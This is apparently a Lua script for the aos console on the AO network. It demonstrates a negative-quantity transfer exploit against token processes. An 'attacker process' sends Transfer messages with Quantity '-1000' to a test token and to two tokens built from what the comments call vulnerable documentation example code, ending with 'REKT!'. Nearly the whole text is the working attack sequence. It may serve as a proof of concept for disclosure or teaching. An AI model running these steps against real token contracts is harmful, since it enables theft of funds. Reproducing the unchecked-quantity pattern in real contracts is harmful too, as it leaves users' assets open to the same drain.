-- aos hack-1 --wallet ./wallets/001.json

-- get ao.id and set a variable in the attacker process:
Victim = "y9qdXnn0EHU-ljepWcc7rLGucdD5DgUSb_4VwmHNs4A"
AO = "m3PaWzK4PTG9lAaqYQPaPdOcXdO8hYqi5Fe9NWqXd0w"
Trunk = "OT9qTE2467gcozb2g8R6D6N3nQS94ENcaAIJfUzHCww"
Bark = "8p7ApPZxC_37M06QHVejCQrKsHbcJEerd3jWNkDUWPQ"
AoCred = "Sa0iBLPNyJQrwpTTG-tWLQU-1QeUAJA73DdxGGiKoJc"
AstroUSDTest = "GcFxqTQnKHcr304qnOcq00ZqbaYGDn4Wbb0DHAM-wvU"

Send({ Target = AstroUSDTest, Action = "Info" })
Inbox[#Inbox]

Send({ Target = AstroUSDTest, Action = "Balance" })
Inbox[#Inbox]

Send({ Target = AstroUSDTest, Action = "Transfer", Tags = { Recipient = Victim, Quantity = "-1000" } })
Inbox[#Inbox]

-- Separately load my new tokens:

-- aos pepe --wallet ./wallets/001.json
-- .load ./contracts/src/tokens/pepe.token.lua

-- aos hammy --wallet ./wallets/001.json
-- .load ./contracts/src/tokens/hammy.token.lua

-- Get their process IDs and set two variables in the attacker process again:
Pepe = "LfjH1WllBRmAeKtSMe-jbKmjiEkXD0GKckb8_xOMvFQ"
Hammy = "IZ_4ZzyWKonaXH8EuWL_y3Yl7LxHCbwl7e561aOtpVQ"

-- Check that they work:
Send({ Target = Pepe, Action = "Info" })
Inbox[#Inbox]

Send({ Target = Hammy, Action = "Info" })
Inbox[#Inbox]

-- Let's verify our balance for both is 0:
Send({ Target = Pepe, Action = "Balance" })
Inbox[#Inbox].Tags.Balance

Send({ Target = Hammy, Action = "Balance" })
Inbox[#Inbox].Tags.Balance

-- Let's verify there's only 1 address with balance:
Send({ Target = Pepe, Action = "Balances" })
Inbox[#Inbox].Data

Send({ Target = Hammy, Action = "Balances" })
Inbox[#Inbox].Data

-- Let's try the hack again with the (VULNERABLE) documentation example code:
Send({ Target = Pepe, Action = "Transfer", Tags = { Recipient = Victim, Quantity = "-1000" } })
-- REKT!
